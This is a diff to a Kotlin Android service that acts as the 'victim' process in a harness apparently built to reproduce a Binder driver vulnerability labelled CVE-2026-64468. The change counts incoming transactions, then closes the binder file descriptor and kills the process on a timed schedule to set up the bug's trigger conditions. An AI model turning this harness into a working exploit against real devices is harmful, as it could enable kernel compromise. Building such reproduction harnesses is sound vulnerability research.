@@ -10,10 +10,14 @@ import android.os.IBinder
 import android.os.Parcel
 import android.os.Process
 import android.util.Log
+import java.util.concurrent.atomic.AtomicBoolean
+import java.util.concurrent.atomic.AtomicInteger
 
 /** P in the CVE-2026-64468 topology: receives e2, sends e1, then dies. */
 class VictimService : Service() {
     private var walker: IBinder? = null
+    private val seen = AtomicInteger(0)
+    private val dying = AtomicBoolean(false)
     private val binder = object : Binder() {
         override fun onTransact(code: Int, data: Parcel, reply: Parcel?, flags: Int): Boolean {
             if (code != 1) return super.onTransact(code, data, reply, flags)
@@ -22,17 +26,23 @@ class VictimService : Service() {
                 Log.e("BinderHarness", "victim has no walker handle")
                 return false
             }
+            val expected = if (data.dataSize() >= 4) data.readInt() else 8
+            val count = seen.incrementAndGet()
             return try {
                 HarnessNative.victimChild(BinderNative.nativeData(target))
-                Log.i("BinderHarness", "victim sent e1; scheduling death")
-                Thread {
-                    try {
-                        Thread.sleep(10)
-                        stopSelf()
-                        Process.killProcess(Process.myPid())
-                    } catch (_: Throwable) {
-                    }
-                }.start()
+                Log.i("BinderHarness", "victim sent e1 count=$count/$expected")
+                if (count >= expected && dying.compareAndSet(false, true)) {
+                    HarnessNative.closeBinder()
+                    Log.i("BinderHarness", "victim closed binder fd")
+                    Thread {
+                        try {
+                            Thread.sleep(30)
+                            stopSelf()
+                            Process.killProcess(Process.myPid())
+                        } catch (_: Throwable) {
+                        }
+                    }.start()
+                }
                 true
             } catch (error: Throwable) {
                 Log.e("BinderHarness", "victim child failed: $error")
